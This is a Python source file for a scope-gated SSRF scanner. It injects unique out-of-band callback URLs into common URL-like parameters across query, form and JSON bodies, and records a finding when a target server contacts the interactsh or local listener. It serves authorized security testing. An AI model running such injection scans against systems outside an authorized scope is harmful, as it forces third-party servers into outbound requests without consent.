#!/usr/bin/env python3
"""ssrf_probe.py - SSRF detector with out-of-band (OOB) validation.

XBOW-style: a finding is real only when a DETERMINISTIC validator proves it. The validator is an
OOB interaction - we inject a URL pointing at an OOB listener into candidate inputs; if the TARGET
SERVER contacts it, the server made an outbound request for us = SSRF, proven, no guessing.

Injection surface (inject.py): query params by default, and optionally form bodies, JSON bodies,
request headers, and path segments (--surfaces). Each injected request carries a UNIQUE marker as
the leftmost DNS label of its OOB payload, so a callback is attributed back to the exact surface +
location that caused it.

OOB providers (oob.py):
  --oob-provider local       127.0.0.1 listener (oob_server.py). Lab only.
  --oob-provider interactsh  public/self-hosted interactsh (DNS+HTTP). Works on REAL targets,
                             because the target calls the public OOB server, not us.

Safety:
  * Scope-gated to authorized hosts only (refuses before any injection).
  * Stops at PROOF (callback fired). Does NOT escalate - no auto-fetching cloud metadata
    (169.254.169.254), internal services, or credentials. Impact assessment is human-gated.
  * Injection traffic goes to the TARGET through whatever egress the box uses (Mullvad); only the
    interactsh poller is split-tunneled. For real engagements, self-host the OOB server
    (--itsh-server your-vps) so OOB data never leaves infra you control.
"""
from __future__ import annotations
import sys, json, argparse, pathlib, urllib.parse, uuid
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from runner import Scope
from authz_probe import in_scope, do, new_jar          # scope logic + rate-limited HTTP
from oob import LocalOOB, InteractshOOB
from inject import build_injections, ALL_SURFACES

PARAMS = ["url", "uri", "link", "src", "dest", "destination", "redirect", "redirect_url",
          "returnUrl", "return", "next", "img", "image", "imageUrl", "host", "domain", "callback",
          "webhook", "fetch", "load", "u", "path", "file", "feed", "to", "out", "continue",
          "data", "target", "site", "proxy", "dataurl"]


def _marker() -> str:
    return "s" + uuid.uuid4().hex[:10]           # DNS-label-safe, unique per injection


def probe(base_url: str, provider, assets, params, surfaces) -> list:
    host = urllib.parse.urlparse(base_url).hostname
    if host and not in_scope(assets, host):
        print(f"REFUSED: {host} not in scope")
        return []

    cj = new_jar()
    injected = {}                                # marker -> InjectedRequest
    for p in params:
        marker = _marker()
        cb = provider.payload(marker)
        # one marker fans out across every requested surface for this param name
        reqs = build_injections(base_url, cb, surfaces=surfaces, query_params=[p])
        # SSRF callback URL only makes sense in url-ish fields; skip header/path noise unless asked
        for r in reqs:
            do(cj, r.method, r.url, data=r.data, headers=r.headers)
        # the marker is shared across this param's surface variants; store a representative req
        injected[marker] = (p, reqs)

    provider.wait()                              # let callbacks land / poller cycle
    seen = provider.seen_markers()

    findings = []
    for marker, (p, reqs) in injected.items():
        if marker not in seen:
            continue
        evidence = provider.interactions_for(marker) if hasattr(provider, "interactions_for") else []
        findings.append({
            "class": "ssrf", "severity": "high", "endpoint": base_url, "param": p,
            "surfaces_tried": list(surfaces),
            "proof_requests": [r.describe() for r in reqs],
            "validated_by": "out-of-band interaction (target server contacted our OOB listener)",
            "oob_provider": provider.__class__.__name__,
            "proof_interactions": evidence,
            "confirmed": True,
            "note": "PROOF of SSRF only - internal/metadata impact is human-gated",
        })
        print(f"[ssrf] CONFIRMED param={p} (marker {marker} seen via OOB) surfaces={list(surfaces)}")
    return findings


def build_provider(a):
    if a.oob_provider == "local":
        if not a.oob:
            raise SystemExit("--oob required for local provider")
        return LocalOOB(a.oob.rstrip("/"), a.oob_log)
    if a.oob_provider == "interactsh":
        return InteractshOOB(a.itsh_client, a.workdir, server=a.itsh_server,
                             poll_wait=a.poll_wait)
    raise SystemExit(f"unknown provider {a.oob_provider}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--scope", default="benchmark/scope_bench.json")
    ap.add_argument("--out", default="ssrf_findings.json")
    ap.add_argument("--surfaces", default="query,form,json",
                    help=f"comma list from {','.join(ALL_SURFACES)} (default query,form,json)")
    ap.add_argument("--oob-provider", choices=["local", "interactsh"], default="interactsh")
    # local provider
    ap.add_argument("--oob", help="local OOB listener base, e.g. http://127.0.0.1:9099")
    ap.add_argument("--oob-log", default="oob_hits.jsonl")
    # interactsh provider
    ap.add_argument("--itsh-client", default=r"C:\Users\Laith\nabulus-tools\bin\interactsh-client.exe")
    ap.add_argument("--itsh-server", default=None, help="self-hosted interactsh server (default: public)")
    ap.add_argument("--workdir", default=str(pathlib.Path(__file__).resolve().parent))
    ap.add_argument("--poll-wait", type=float, default=11.0)
    a = ap.parse_args()

    surfaces = tuple(s.strip() for s in a.surfaces.split(",") if s.strip() in ALL_SURFACES)
    scope = Scope(json.loads(pathlib.Path(a.scope).read_text()))
    provider = build_provider(a)
    provider.start()
    try:
        f = probe(a.target, provider, scope.assets, PARAMS, surfaces)
    finally:
        provider.stop()
    pathlib.Path(a.out).write_text(json.dumps(f, indent=2))
    print(f"[ssrf] {len(f)} confirmed SSRF finding(s) -> {a.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
